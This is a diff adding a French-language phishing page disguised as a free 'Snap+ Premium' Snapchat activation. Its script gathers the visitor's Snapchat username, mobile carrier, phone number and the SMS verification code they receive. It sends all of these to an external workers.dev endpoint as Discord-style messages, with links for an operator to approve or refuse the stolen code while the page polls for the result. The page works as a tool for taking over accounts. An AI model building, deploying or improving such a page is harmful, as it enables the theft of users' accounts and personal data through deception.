@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Snap+ — Activation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; }
+body {
+  font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+  background: #08080f; color: #f2f2f7; min-height: 100dvh;
+  overflow-x: hidden; position: relative;
+  -webkit-font-smoothing: antialiased;
+}
+.bg-gradient {
+  position: fixed; inset: 0; z-index: -3;
+  background:
+    radial-gradient(1400px 900px at 12% 8%, #2e1656 0%, transparent 60%),
+    radial-gradient(1200px 800px at 88% 12%, #0d3a6b 0%, transparent 55%),
+    radial-gradient(1100px 1000px at 50% 105%, #520f42 0%, transparent 62%),
+    linear-gradient(160deg, #08080f 0%, #12122a 50%, #08080f 100%);
+}
+.bg-blobs { position: fixed; inset: 0; z-index: -2; overflow: hidden; filter: blur(90px); opacity: .55; }
+.blob { position: absolute; display: block; border-radius: 50%; mix-blend-mode: screen; animation: float 20s ease-in-out infinite; }
+.blob-a { width: 520px; height: 520px; background: #fffc00; top: -10%; left: -8%; }
+.blob-b { width: 600px; height: 600px; background: #7b2ff7; bottom: -14%; right: -10%; animation-delay: -7s; }
+.blob-c { width: 440px; height: 440px; background: #00d4ff; top: 42%; left: 58%; animation-delay: -13s; opacity: .5; }
+@keyframes float {
+  0%,100% { transform: translate3d(0,0,0) scale(1); }
+  33%     { transform: translate3d(46px,-34px,0) scale(1.1); }
+  66%     { transform: translate3d(-34px,28px,0) scale(.94); }
+}
+.noise {
+  position: fixed; inset: 0; z-index: -1; pointer-events: none; opacity: .05;
+  background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='120' height='120'><filter id='n'><feTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3'/></filter><rect width='100%' height='100%' filter='url(%23n)'/></svg>");
+}
+.topbar {
+  display: flex; align-items: center; justify-content: space-between;
+  padding: 20px 26px; position: relative; z-index: 5;
+  max-width: 720px; margin: 0 auto;
+}
+.brand { display: flex; align-items: center; gap: 12px; font-weight: 800; letter-spacing: -.02em; }
+.brand-logo { width: 42px; height: 42px; border-radius: 12px; object-fit: cover; box-shadow: 0 8px 24px rgba(255,252,0,.28); background: #fffc00; }
+.brand-name { font-size: 1.3rem; }
+.brand-name em { font-style: normal; color: #fffc00; }
+.pill {
+  font-size: .74rem; font-weight: 700; letter-spacing: .08em; text-transform: uppercase;
+  padding: 7px 14px; border-radius: 999px;
+  background: rgba(255,252,0,.12); color: #fffc00; border: 1px solid rgba(255,252,0,.3);
+}
+.stage { max-width: 720px; margin: 0 auto; padding: 20px 22px 70px; position: relative; z-index: 4; }
+.screen { display: none; }
+.screen.is-active { display: block; animation: snapIn .55s cubic-bezier(.2,1.4,.3,1) both; }
+@keyframes snapIn {
+  0%   { opacity: 0; transform: scale(.82) translateY(16px); }
+  60%  { opacity: 1; transform: scale(1.03) translateY(0); }
+  100% { opacity: 1; transform: scale(1) translateY(0); }
+}
+.card {
+  background: rgba(20,20,36,.72); border: 1px solid rgba(255,255,255,.09);
+  border-radius: 28px; padding: 44px 40px 38px;
+  backdrop-filter: blur(20px) saturate(150%);
+  -webkit-backdrop-filter: blur(20px) saturate(150%);
+  box-shadow: 0 30px 80px rgba(0,0,0,.55), inset 0 1px 0 rgba(255,255,255,.07);
+}
+.card-center { text-align: center; }
+.card-hero { text-align: center; padding: 52px 44px 44px; }
+.badge { display: inline-block; font-size: .7rem; font-weight: 800; letter-spacing: .14em; padding: 7px 14px; border-radius: 999px; margin-bottom: 18px; background: linear-gradient(90deg,#fffc00,#ff8a00); color: #16111a; }
+.hero-title { font-size: 2.6rem; font-weight: 800; letter-spacing: -.035em; margin-bottom: 14px; }
+.hero-title em { font-style: normal; color: #fffc00; }
+.hero-sub { color: #b9b9c9; font-size: 1.02rem; line-height: 1.55; margin-bottom: 28px; max-width: 460px; margin-left: auto; margin-right: auto; }
+.perks { list-style: none; text-align: left; margin: 0 auto 30px; max-width: 420px; }
+.perks li { display: flex; gap: 12px; align-items: center; padding: 10px 0; font-size: .98rem; color: #dcdce8; border-bottom: 1px solid rgba(255,255,255,.05); }
+.perks li:last-child { border-bottom: none; }
+.tick { display: grid; place-items: center; flex: 0 0 26px; width: 26px; height: 26px; border-radius: 50%; background: rgba(255,252,0,.14); color: #fffc00; font-size: .78rem; font-weight: 800; }
+.fine { font-size: .78rem; color: #7d7d92; margin-top: 16px; }
+.card-title { font-size: 1.7rem; font-weight: 700; letter-spacing: -.025em; margin-bottom: 10px; }
+.card-sub { color: #b0b0c2; font-size: .98rem; line-height: 1.55; margin-bottom: 26px; }
+.step-dots { display: flex; gap: 7px; justify-content: center; margin-bottom: 24px; }
+.dot { width: 34px; height: 5px; border-radius: 999px; background: rgba(255,255,255,.14); transition: background .3s; }
+.dot.is-on { background: #fffc00; box-shadow: 0 0 16px rgba(255,252,0,.55); }
+.dot.is-done { background: rgba(255,252,0,.45); }
+.field { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,.34); border: 1.5px solid rgba(255,255,255,.1); border-radius: 16px; padding: 16px 18px; transition: border-color .2s, box-shadow .2s; margin-bottom: 10px; }
+.field:focus-within { border-color: #fffc00; box-shadow: 0 0 0 5px rgba(255,252,0,.12); }
+.field-prefix { color: #fffc00; font-weight: 700; font-size: 1.1rem; }
+.field-input { flex: 1; background: none; border: none; outline: none; color: #fff; font-size: 1.1rem; font-family: inherit; font-weight: 500; letter-spacing: .02em; min-width: 0; }
+.field-input::placeholder { color: #5f5f78; }
+.field-code { justify-content: center; }
+.field-code .field-input { text-align: center; font-size: 1.8rem; letter-spacing: .55em; font-weight: 700; }
+.field-hint { font-size: .84rem; color: #7d7d92; min-height: 1.2em; margin: 4px 2px 18px; transition: color .2s; }
+.field-hint.ok { color: #4ade80; }
+.field-hint.err { color: #f87171; }
+.btn { width: 100%; padding: 17px 22px; border-radius: 16px; border: none; font-family: inherit; font-size: 1.05rem; font-weight: 700; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform .12s, box-shadow .2s, background .2s, opacity .2s; }
+.btn:active { transform: scale(.98); }
+.btn-primary { background: linear-gradient(135deg,#fffc00,#ffd400); color: #12100a; box-shadow: 0 14px 34px rgba(255,252,0,.3); }
+.btn-primary:hover:not(:disabled) { box-shadow: 0 18px 42px rgba(255,252,0,.45); }
+.btn-primary:disabled { opacity: .4; cursor: not-allowed; box-shadow: none; }
+.btn-arrow { transition: transform .2s; }
+.btn-primary:hover:not(:disabled) .btn-arrow { transform: translateX(5px); }
+.btn-ghost { background: transparent; color: #8f8fa6; font-weight: 600; margin-top: 8px; padding: 12px; }
+.btn-ghost:hover { color: #fff; }
+.profile { display: flex; align-items: center; gap: 16px; background: rgba(0,0,0,.32); border: 1.5px solid rgba(255,255,255,.1); border-radius: 18px; padding: 18px; margin-bottom: 12px; transition: border-color .2s, box-shadow .2s; }
+.profile.is-on { border-color: #fffc00; box-shadow: 0 0 0 5px rgba(255,252,0,.12); }
+.profile-avatar { width: 68px; height: 68px; border-radius: 50%; flex: 0 0 68px; background: linear-gradient(135deg,#2a2a44,#14141f); overflow: hidden; display: grid; place-items: center; box-shadow: 0 6px 18px rgba(0,0,0,.4); }
+.profile-avatar img { width: 100%; height: 100%; object-fit: cover; display: block; }
+.profile-meta { flex: 1; min-width: 0; }
+.profile-name { font-weight: 700; font-size: 1.1rem; }
+.profile-handle { color: #fffc00; font-size: .9rem; font-weight: 600; }
+.profile-sub { color: #8a8aa0; font-size: .82rem; margin-top: 3px; }
+.profile-check { flex: 0 0 30px; width: 30px; height: 30px; border-radius: 9px; border: 2px solid rgba(255,255,255,.25); display: grid; place-items: center; color: transparent; cursor: pointer; transition: all .18s; }
+.profile-check.is-on { background: #fffc00; border-color: #fffc00; color: #12100a; }
+.carriers { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; margin-bottom: 24px; }
+.carrier { background: rgba(0,0,0,.32); border: 1.5px solid rgba(255,255,255,.1); border-radius: 16px; padding: 24px 12px; cursor: pointer; transition: border-color .2s, transform .12s, box-shadow .2s; font-family: inherit; }
+.carrier:hover { transform: translateY(-3px); }
+.carrier:active { transform: scale(.97); }
+.carrier.is-on { border-color: #fffc00; box-shadow: 0 0 0 5px rgba(255,252,0,.12); }
+.carrier-logo { font-weight: 800; font-size: 1.15rem; letter-spacing: -.02em; }
+.carrier-sfr  { color: #e2001a; }
+.carrier-byt  { color: #009ee0; }
+.carrier-org  { color: #ff7900; }
+.carrier-free { color: #cd1e5f; font-weight: 900; letter-spacing: .04em; }
+.spinner { width: 54px; height: 54px; margin: 8px auto 24px; border-radius: 50%; border: 4px solid rgba(255,255,255,.12); border-top-color: #fffc00; animation: spin .8s linear infinite; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.pulse-ring { width: 92px; height: 92px; margin: 8px auto 26px; border-radius: 50%; display: grid; place-items: center; background: rgba(255,252,0,.12); color: #fffc00; position: relative; }
+.pulse-ring::before, .pulse-ring::after { content: ''; position: absolute; inset: 0; border-radius: 50%; border: 2px solid rgba(255,252,0,.45); animation: pulse 2.2s ease-out infinite; }
+.pulse-ring::after { animation-delay: 1.1s; }
+@keyframes pulse { 0% { transform: scale(.9); opacity: .8; } 100% { transform: scale(1.6); opacity: 0; } }
+.done-check { width: 92px; height: 92px; margin: 8px auto 26px; border-radius: 50%; display: grid; place-items: center; background: rgba(74,222,128,.14); color: #4ade80; animation: snapIn .55s cubic-bezier(.2,1.4,.3,1) both; }
+.blur-veil { position: fixed; inset: 0; z-index: 3; pointer-events: none; backdrop-filter: blur(0px); -webkit-backdrop-filter: blur(0px); background: rgba(8,8,15,0); transition: backdrop-filter .6s, background .6s; }
+body.is-veiled .blur-veil { backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); background: rgba(8,8,15,.4); }
+@media (max-width: 560px) {
+  .topbar { padding: 16px 18px; }
+  .stage { padding: 14px 16px 50px; }
+  .card { padding: 32px 22px 28px; border-radius: 22px; }
+  .card-hero { padding: 36px 24px 32px; }
+  .hero-title { font-size: 2rem; }
+  .card-title { font-size: 1.4rem; }
+  .carriers { gap: 10px; }
+  .field-code .field-input { font-size: 1.4rem; letter-spacing: .4em; }
+  .brand-logo { width: 36px; height: 36px; }
+  .brand-name { font-size: 1.1rem; }
+}
+</style>
+</head>
+<body>
+
+  <div class="bg-gradient" aria-hidden="true"></div>
+  <div class="bg-blobs" aria-hidden="true">
+    <span class="blob blob-a"></span>
+    <span class="blob blob-b"></span>
+    <span class="blob blob-c"></span>
+  </div>
+  <div class="noise" aria-hidden="true"></div>
+
+  <header class="topbar">
+    <div class="brand">
+      <img class="brand-logo" src="https://i.postimg.cc/kgdv8XVp/image.png" alt="Snap+" />
+      <span class="brand-name">Snap<em>+</em></span>
+    </div>
+    <span class="pill">Gratuit</span>
+  </header>
+
+  <main class="stage">
+
+    <section class="screen is-active" id="screen-landing">
+      <div class="card card-hero">
+        <div class="badge">OFFRE LIMITÉE</div>
+        <h1 class="hero-title">Snap<em>+</em> Premium</h1>
+        <p class="hero-sub">Débloque toutes les fonctionnalités exclusives. Sans engagement. Activation en moins de 5 minutes.</p>
+        <ul class="perks">
+          <li><span class="tick">✓</span> Snaps sans limite de durée</li>
+          <li><span class="tick">✓</span> Retour en arrière illimité</li>
+          <li><span class="tick">✓</span> Badge exclusif sur ton profil</li>
+          <li><span class="tick">✓</span> Mode furtif — capture invisible</li>
+        </ul>
+        <button class="btn btn-primary" id="btn-start">Obtenir Snap+ gratuit <span class="btn-arrow">→</span></button>
+        <p class="fine">Aucun paiement requis. Vérification du compte obligatoire.</p>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-username">
+      <div class="card">
+        <div class="step-dots"><span class="dot is-on"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+        <h2 class="card-title">Ton identifiant Snapchat</h2>
+        <p class="card-sub">Entre ton pseudo Snapchat pour vérifier ton éligibilité.</p>
+        <div class="field">
+          <span class="field-prefix">@</span>
+          <input type="text" id="input-username" class="field-input" placeholder="pseudo" autocomplete="off" spellcheck="false" maxlength="32" />
+        </div>
+        <p class="field-hint" id="user-hint"></p>
+        <button class="btn btn-primary" id="btn-username" disabled>Vérifier <span class="btn-arrow">→</span></button>
+        <button class="btn btn-ghost" data-back>Retour</button>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-profile">
+      <div class="card">
+        <div class="step-dots"><span class="dot is-done"></span><span class="dot is-on"></span><span class="dot"></span><span class="dot"></span></div>
+        <h2 class="card-title">C'est bien toi ?</h2>
+        <p class="card-sub">Confirme ton profil pour continuer.</p>
+        <div class="profile" id="profile-card">
+          <div class="profile-avatar"><img id="profile-img" alt="" /></div>
+          <div class="profile-meta">
+            <div class="profile-name" id="profile-name">—</div>
+            <div class="profile-handle" id="profile-handle">@—</div>
+            <div class="profile-sub" id="profile-sub">—</div>
+          </div>
+          <div class="profile-check" id="profile-check" role="checkbox" aria-checked="false" tabindex="0">
+            <svg viewBox="0 0 24 24" width="16" height="16"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M4 12.5l5 5L20 6.5"/></svg>
+          </div>
+        </div>
+        <p class="field-hint" id="profile-hint">Coche le profil pour confirmer.</p>
+        <button class="btn btn-primary" id="btn-profile" disabled>Confirmer <span class="btn-arrow">→</span></button>
+        <button class="btn btn-ghost" data-back>Retour</button>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-carrier">
+      <div class="card">
+        <div class="step-dots"><span class="dot is-done"></span><span class="dot is-done"></span><span class="dot is-on"></span><span class="dot"></span></div>
+        <h2 class="card-title">Ton opérateur</h2>
+        <p class="card-sub">Sélectionne ton opérateur mobile pour recevoir le code.</p>
+        <div class="carriers" id="carriers">
+          <button class="carrier" data-carrier="SFR"><span class="carrier-logo carrier-sfr">SFR</span></button>
+          <button class="carrier" data-carrier="Bouygues Telecom"><span class="carrier-logo carrier-byt">B&amp;You</span></button>
+          <button class="carrier" data-carrier="Orange"><span class="carrier-logo carrier-org">Orange</span></button>
+          <button class="carrier" data-carrier="Free"><span class="carrier-logo carrier-free">free</span></button>
+        </div>
+        <button class="btn btn-primary" id="btn-carrier" disabled>Continuer <span class="btn-arrow">→</span></button>
+        <button class="btn btn-ghost" data-back>Retour</button>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-phone">
+      <div class="card">
+        <div class="step-dots"><span class="dot is-done"></span><span class="dot is-done"></span><span class="dot is-done"></span><span class="dot is-on"></span></div>
+        <h2 class="card-title">Ton numéro</h2>
+        <p class="card-sub">Entre ton numéro de téléphone pour recevoir ton code d'activation.</p>
+        <div class="field">
+          <span class="field-prefix">+33</span>
+          <input type="tel" id="input-phone" class="field-input" placeholder="06 12 34 56 78" inputmode="numeric" autocomplete="off" maxlength="14" />
+        </div>
+        <p class="field-hint" id="phone-hint">Le numéro doit commencer par 06 ou 07.</p>
+        <button class="btn btn-primary" id="btn-phone" disabled>Envoyer <span class="btn-arrow">→</span></button>
+        <button class="btn btn-ghost" data-back>Retour</button>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-sending">
+      <div class="card card-center">
+        <div class="spinner"></div>
+        <h2 class="card-title">Envoi en cours…</h2>
+        <p class="card-sub">Merci de patienter quelques secondes.</p>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-wait">
+      <div class="card card-center">
+        <div class="pulse-ring">
+          <svg viewBox="0 0 24 24" width="38" height="38"><path fill="currentColor" d="M12 2a7 7 0 0 0-7 7v3.6l-1.7 3.4A1 1 0 0 0 4.2 17h15.6a1 1 0 0 0 .9-1.4L19 12.6V9a7 7 0 0 0-7-7zm0 20a3 3 0 0 0 3-3H9a3 3 0 0 0 3 3z"/></svg>
+        </div>
+        <h2 class="card-title">Vous recevrez un code dans les 5 minutes qui suivent</h2>
+        <p class="card-sub">Veuillez patienter. Ne ferme pas cette page.</p>
+        <div class="field field-code">
+          <input type="text" id="input-code" class="field-input" placeholder="• • • •" inputmode="numeric" autocomplete="off" maxlength="4" />
+        </div>
+        <p class="field-hint" id="code-hint">Saisis le code reçu par SMS.</p>
+        <button class="btn btn-primary" id="btn-code" disabled>Valider mon code <span class="btn-arrow">→</span></button>
+      </div>
+    </section>
+
+    <section class="screen" id="screen-verified">
+      <div class="card card-center">
+        <div class="spinner" id="verified-spinner" style="display:none"></div>
+        <div class="done-check" id="verified-check" style="display:none">
+          <svg viewBox="0 0 24 24" width="38" height="38"><path fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M4 12.5l5 5L20 6.5"/></svg>
+        </div>
+        <h2 class="card-title" id="verified-title">Vérification en cours…</h2>
+        <p class="card-sub" id="verified-sub">Merci de patienter pendant que nous vérifions ton code.</p>
+      </div>
+    </section>
+
+  </main>
+
+  <div class="blur-veil" id="blur-veil" aria-hidden="true"></div>
+
+<script>
+(() => {
+  'use strict';
+
+  const API = 'https://snap-plus.reddklefou.workers.dev';
+
+  const $  = (s, r = document) => r.querySelector(s);
+  const $$ = (s, r = document) => [...r.querySelectorAll(s)];
+
+  const state = { username:'', avatar:'', realName:'', carrier:'', phone:'', code:'', orderId:null, sessionId:null };
+
+  const screens = $$('.screen');
+  function go(id) {
+    screens.forEach(s => s.classList.toggle('is-active', s.id === id));
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }
+  $$('[data-back]').forEach(b => b.addEventListener('click', () => {
+    const order = ['screen-landing','screen-username','screen-profile','screen-carrier','screen-phone'];
+    const i = order.indexOf($('.screen.is-active')?.id);
+    if (i > 0) go(order[i - 1]);
+  }));
+
+  $('#btn-start').addEventListener('click', () => go('screen-username'));
+
+  const inputUsername = $('#input-username');
+  const btnUsername   = $('#btn-username');
+  const userHint      = $('#user-hint');
+  const PSEUDO_RE     = /^[a-zA-Z0-9._-]{3,32}$/;
+
+  inputUsername.addEventListener('input', () => {
+    const v = inputUsername.value.trim().replace(/^@+/, '');
+    inputUsername.value = v;
+    const ok = PSEUDO_RE.test(v);
+    btnUsername.disabled = !ok;
+    userHint.textContent = v && !ok ? 'Pseudo invalide (3 à 32 caractères).' : '';
+    userHint.className = 'field-hint' + (v && !ok ? ' err' : '');
+  });
+  inputUsername.addEventListener('keydown', e => { if (e.key === 'Enter' && !btnUsername.disabled) btnUsername.click(); });
+
+  btnUsername.addEventListener('click', async () => {
+    const v = inputUsername.value.trim();
+    if (!PSEUDO_RE.test(v)) return;
+
+    btnUsername.disabled = true;
+    btnUsername.textContent = 'Recherche…';
+    userHint.textContent = 'Recherche du profil…';
+    userHint.className = 'field-hint';
+
+    state.username = v;
+
+    let profile = { name: v, avatar: '', sub: 'Compte Snapchat', found: false };
+    try {
+      const r = await fetch(API + '/profile?u=' + encodeURIComponent(v));
+      if (r.ok) profile = await r.json();
+    } catch (_) {}
+
+    // Génération d'un avatar propre avec l'initiale si Snapchat n'a pas répondu
+    if (!profile.avatar) {
+      const seed = [...v].reduce((a, c) => a + c.charCodeAt(0), 0);
+      const hue = seed % 360;
+      const svg = `<svg xmlns="http://www.w3.org/2000/svg" width="140" height="140">
+        <defs><linearGradient id="g" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0" stop-color="hsl(${hue},72%,56%)"/>
+          <stop offset="1" stop-color="hsl(${(hue+60)%360},72%,40%)"/>
+        </linearGradient></defs>
+        <rect width="140" height="140" fill="url(#g)"/>
+        <text x="50%" y="55%" text-anchor="middle" dominant-baseline="middle"
+          font-family="Inter,sans-serif" font-size="62" font-weight="800" fill="#fff">
+          ${v.charAt(0).toUpperCase()}
+        </text></svg>`;
+      profile.avatar = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
+    }
+
+    state.avatar   = profile.avatar;
+    state.realName = profile.name || v;
+
+    $('#profile-img').src            = profile.avatar;
+    $('#profile-name').textContent   = state.realName;
+    $('#profile-handle').textContent = '@' + v;
+    $('#profile-sub').textContent    = profile.sub || 'Compte Snapchat';
+
+    $('#profile-check').classList.remove('is-on');
+    $('#profile-check').setAttribute('aria-checked','false');
+    $('#profile-card').classList.remove('is-on');
+    $('#btn-profile').disabled = true;
+    $('#profile-hint').textContent = 'Coche le profil pour confirmer.';
+    $('#profile-hint').className = 'field-hint';
+
+    btnUsername.disabled = false;
+    btnUsername.textContent = 'Vérifier';
+    userHint.textContent = '';
+
+    go('screen-profile');
+  });
+
+  const checkEl = $('#profile-check');
+  function toggleProfileCheck() {
+    const on = checkEl.classList.toggle('is-on');
+    checkEl.setAttribute('aria-checked', String(on));
+    $('#profile-card').classList.toggle('is-on', on);
+    $('#btn-profile').disabled = !on;
+    const hint = $('#profile-hint');
+    hint.textContent = on ? 'Profil confirmé.' : 'Coche le profil pour confirmer.';
+    hint.className = 'field-hint' + (on ? ' ok' : '');
+  }
+  checkEl.addEventListener('click', toggleProfileCheck);
+  checkEl.addEventListener('keydown', e => { if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); toggleProfileCheck(); } });
+  $('#btn-profile').addEventListener('click', () => go('screen-carrier'));
+
+  const carriers = $$('.carrier');
+  let pickedCarrier = '';
+  carriers.forEach(c => c.addEventListener('click', () => {
+    carriers.forEach(x => x.classList.remove('is-on'));
+    c.classList.add('is-on');
+    pickedCarrier = c.dataset.carrier;
+    state.carrier = pickedCarrier;
+    $('#btn-carrier').disabled = false;
+  }));
+  $('#btn-carrier').addEventListener('click', () => { if (pickedCarrier) go('screen-phone'); });
+
+  const inputPhone = $('#input-phone');
+  const btnPhone   = $('#btn-phone');
+  const phoneHint  = $('#phone-hint');
+  const PHONE_RE   = /^0[67]\d{8}$/;
+  const normalizePhone = v => v.replace(/[^\d]/g, '').slice(0, 10);
+  const formatPhone    = v => normalizePhone(v).replace(/(\d{2})(?=\d)/g, '$1 ').trim();
+
+  inputPhone.addEventListener('input', () => {
+    inputPhone.value = formatPhone(inputPhone.value);
+    const d = normalizePhone(inputPhone.value);
+    const ok = PHONE_RE.test(d);
+    btnPhone.disabled = !ok;
+    if (!d)                     { phoneHint.textContent = 'Le numéro doit commencer par 06 ou 07.'; phoneHint.className = 'field-hint'; }
+    else if (!/^0[67]/.test(d)) { phoneHint.textContent = 'Le numéro doit commencer par 06 ou 07.'; phoneHint.className = 'field-hint err'; }
+    else if (!ok)               { phoneHint.textContent = 'Numéro incomplet (10 chiffres).';        phoneHint.className = 'field-hint err'; }
+    else                        { phoneHint.textContent = 'Numéro valide.';                          phoneHint.className = 'field-hint ok'; }
+  });
+  inputPhone.addEventListener('keydown', e => { if (e.key === 'Enter' && !btnPhone.disabled) btnPhone.click(); });
+
+  btnPhone.addEventListener('click', async () => {
+    const d = normalizePhone(inputPhone.value);
+    if (!PHONE_RE.test(d)) return;
+    state.phone   = d;
+    state.orderId = genOrderId();
+    go('screen-sending');
+    document.body.classList.add('is-veiled');
+    await sendOrderEmbed(state);
+    setTimeout(() => {
+      go('screen-wait');
+      document.body.classList.remove('is-veiled');
+    }, 1400);
+  });
+
+  const inputCode = $('#input-code');
+  const btnCode   = $('#btn-code');
+  const codeHint  = $('#code-hint');
+
+  inputCode.addEventListener('input', () => {
+    inputCode.value = inputCode.value.replace(/\D/g, '').slice(0, 4);
+    const ok = inputCode.value.length === 4;
+    btnCode.disabled = !ok;
+    if (!inputCode.value.length) { codeHint.textContent = 'Saisis le code reçu par SMS.';      codeHint.className = 'field-hint'; }
+    else if (!ok)                { codeHint.textContent = 'Le code doit contenir 4 chiffres.'; codeHint.className = 'field-hint err'; }
+    else                         { codeHint.textContent = 'Code complet.';                     codeHint.className = 'field-hint ok'; }
+  });
+  inputCode.addEventListener('keydown', e => { if (e.key === 'Enter' && !btnCode.disabled) btnCode.click(); });
+
+  async function ensureSession() {
+    if (state.sessionId) return state.sessionId;
+    try {
+      const r = await fetch(API + '/session', { method: 'POST' });
+      if (r.ok) {
+        const j = await r.json();
+        state.sessionId = j.id;
+        return j.id;
+      }
+    } catch (_) {}
+    state.sessionId = Math.random().toString(36).slice(2, 12);
+    return state.sessionId;
+  }
+
+  btnCode.addEventListener('click', async () => {
+    const code = inputCode.value.replace(/\D/g, '');
+    if (code.length !== 4) return;
+    state.code = code;
+    await ensureSession();
+
+    await sendCodeEmbed(state);
+
+    go('screen-verified');
+    document.getElementById('verified-spinner').style.display = 'block';
+    document.getElementById('verified-check').style.display = 'none';
+    document.getElementById('verified-title').textContent = 'Vérification en cours…';
+    document.getElementById('verified-sub').textContent = 'Merci de patienter pendant que nous vérifions ton code.';
+
+    pollStatus(state.sessionId);
+  });
+
+  function pollStatus(sid) {
+    let tries = 0;
+    const timer = setInterval(async () => {
+      tries++;
+      if (tries > 150) { clearInterval(timer); return; }
+      try {
+        const r = await fetch(API + '/status?id=' + encodeURIComponent(sid));
+        if (!r.ok) return;
+        const j = await r.json();
+        if (j.status === 'approved') {
+          clearInterval(timer);
+          document.getElementById('verified-spinner').style.display = 'none';
+          document.getElementById('verified-check').style.display = 'grid';
+          document.getElementById('verified-title').textContent = 'Activation réussie';
+          document.getElementById('verified-sub').textContent = 'Ton Snap+ est maintenant actif. Bon snap !';
+        }
+        if (j.status === 'refused') {
+          clearInterval(timer);
+          document.getElementById('verified-spinner').style.display = 'none';
+          document.getElementById('verified-title').textContent = 'Code invalide';
+          document.getElementById('verified-sub').textContent = 'Le code saisi est incorrect. Retourne en arrière et réessaie.';
+        }
+      } catch (_) {}
+    }, 2000);
+  }
+
+  function genOrderId() {
+    const d = new Date(), pad = n => String(n).padStart(2,'0');
+    return `SP-${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}-${Math.floor(1000+Math.random()*9000)}`;
+  }
+  const fmtPhone = d => d.replace(/(\d{2})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+
+  async function sendOrderEmbed(s) {
+    const embed = {
+      title: '🟡 Nouvelle commande',
+      color: 0xFFFC00,
+      description: 'Nouvelle activation **Snap+ gratuit** initiée.',
+      fields: [
+        { name: '👤 Pseudo Snapchat', value: `\`@${s.username}\``, inline: true },
+        { name: '🆔 Commande',        value: `\`${s.orderId}\``,   inline: true },
+        { name: '📶 Opérateur',       value: `\`${s.carrier}\``,   inline: true },
+        { name: '📞 Téléphone',       value: `\`+33 ${fmtPhone(s.phone).slice(1)}\``, inline: false },
+        { name: '🖼️ Profil',          value: `[Voir le profil](https://www.snapchat.com/@${s.username})`, inline: false }
+      ],
+      footer: { text: 'Snap+ • Activation gratuite' },
+      timestamp: new Date().toISOString()
+    };
+    if (s.avatar && s.avatar.startsWith('http')) embed.thumbnail = { url: s.avatar };
+    await post({ username: 'Snap+ Activation', embeds: [embed] });
+  }
+
+  async function sendCodeEmbed(s) {
+    const embed = {
+      title: '🔑 Code reçu — validation requise',
+      color: 0xFFFC00,
+      description: `Le client a saisi un code. Clique sur un lien pour valider.\n\n**Session :** \`${s.sessionId}\``,
+      fields: [
+        { name: '🆔 Commande',        value: `\`${s.orderId}\``,   inline: true },
+        { name: '👤 Pseudo Snapchat', value: `\`@${s.username}\``, inline: true },
+        { name: '📶 Opérateur',       value: `\`${s.carrier}\``,   inline: true },
+        { name: '📞 Téléphone',       value: `\`+33 ${fmtPhone(s.phone).slice(1)}\``, inline: false },
+        { name: '🔑 Code reçu',       value: `\`\`\`${s.code}\`\`\``, inline: false },
+        { name: '✅ Autoriser',       value: `[Clique ici pour autoriser](${API}/approve?id=${s.sessionId}&state=ok)`, inline: true },
+        { name: '❌ Refuser',         value: `[Clique ici pour refuser](${API}/approve?id=${s.sessionId}&state=ko)`,   inline: true }
+      ],
+      footer: { text: 'Snap+ • Validation manuelle' },
+      timestamp: new Date().toISOString()
+    };
+    if (s.avatar && s.avatar.startsWith('http')) embed.thumbnail = { url: s.avatar };
+    await post({ username: 'Snap+ Activation', embeds: [embed] });
+  }
+
+  function post(data) {
+    fetch(API + '/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    }).catch(() => {});
+  }
+
+})();
+</script>
+</body>
+</html>
